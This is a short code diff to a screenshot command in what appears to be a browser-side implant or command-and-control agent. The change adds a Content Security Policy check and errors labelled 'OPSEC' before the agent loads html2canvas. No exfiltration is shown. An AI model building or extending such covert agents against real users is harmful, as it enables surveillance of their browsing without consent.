@@ -5,10 +5,17 @@ COMMANDS['screenshot'] = async function(task) {
             return;
         }
 
+        // Check CSP before loading external script
+        var csp = checkCSP('script-src');
+        if (!csp.allowed) {
+            reject(new Error('OPSEC: CSP blocks external scripts (' + csp.reason + '). Use embed_html2canvas build option.'));
+            return;
+        }
+
         var s = document.createElement('script');
         s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
         s.onload = capture;
-        s.onerror = function() { reject(new Error('failed to load html2canvas')); };
+        s.onerror = function() { reject(new Error('Failed to load html2canvas. CSP or network may be blocking. Use embed_html2canvas build option.')); };
         (document.head || document.documentElement).appendChild(s);
 
         function capture() {
